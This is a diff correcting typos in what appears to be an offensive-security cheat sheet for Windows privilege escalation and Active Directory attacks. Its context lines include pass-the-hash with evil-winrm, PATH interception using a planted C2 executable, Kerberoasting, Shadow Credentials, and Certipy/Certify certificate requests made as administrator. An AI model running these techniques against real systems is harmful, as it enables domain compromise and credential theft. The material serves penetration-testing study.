@@ -25,7 +25,7 @@ C++ Code for using a token that belongs to another process.
 
 Works by setting the `PID_TO_IMPERSONATE` variable to a process ID that you have access to.
 
-[!NOTE] MUST HAVE IMPERSONATE ACCESS TO THE PID. WILL NOT WORK IF USER DOES NOT HAVE INITAL PERMS TO THE PID [!NOTE]
+[!NOTE] MUST HAVE IMPERSONATE ACCESS TO THE PID. WILL NOT WORK IF USER DOES NOT HAVE INITIAL PERMS TO THE PID [!NOTE]
 
 
 ```cpp
@@ -135,13 +135,13 @@ evil-winrm -i ws01 -u administrator -H 32ed87bd5fdc5e9cba88547376818d4
 **$Path Interception**
 This is a "poison the well" type attack
 
-Path Interception abuse is possible if the envionrment variable is
+Path Interception abuse is possible if the environment variable is
 - **1** The folder is writable by the user
 - **2** The folder precedes `c:\Windows\System32` For example if `c:\temp` is in the `env:Path`
 
 In order for this attack to work you must name your malicious file the same name as a shorthand program.
 For example `calc.exe`. This is because `calc.exe` can be called via the short hand command `calc`. 
-When a high privlege user calls `calc` via run/cmd/powershell/ it will execute the `calc.exe` file within
+When a high privilege user calls `calc` via run/cmd/powershell/ it will execute the `calc.exe` file within
 `C:\temp` first before the one in System32
 
 **STEP 1:** `Place a c2 .exe within the c:\temp\ folder` 
@@ -174,10 +174,10 @@ See: [Ired-Team](https://www.ired.team/offensive-security/privilege-escalation/e
 ## Active Directory
 
 ### Kerberoasting
-Abuse service accounts running with elevated privleges 
-Keroasting is possible if:
+Abuse service accounts running with elevated privileges 
+Kerberoasting is possible if:
 - 1 A service account has an SPN
-- 2 The password is weak or reused to be cracked in hashcat or other prefered tool
+- 2 The password is weak or reused to be cracked in hashcat or other preferred tool
 
 ```bash
 # using impacket
@@ -261,7 +261,7 @@ Set-ADAccountPassword targetuser -Reset -NewPassword (ConvertTo-SecureString 'Pa
 ```
 
 ### Shadow Credentials
-Inject certificate-based authentication material into a privleged account
+Inject certificate-based authentication material into a privileged account
 
 Shadow Credentials are possible if:
 - 1 You can write `msDS-KeyCredentialLink`
@@ -330,7 +330,7 @@ _Enumerate vulnerable templates:_
 ```bash
 certipy find -u user -p pass -dc-ip <DC_IP>
 ```
-_Request a certifcate as another user:_
+_Request a certificate as another user:_
 ```bash
 certipy req -u user -p pass -ca CA01 -template VulnerableTemplate -upn administrator@domain.local
 ```
@@ -347,7 +347,7 @@ _Find a vulnerable template:_
 Certify.exe find /vulnerable
 ```
 
-_Request a certifcate for another user:_
+_Request a certificate for another user:_
 ```powershell
 Certify.exe request /ca:CA01 /template:VulnerableTemplate /altname:administrator
 ```
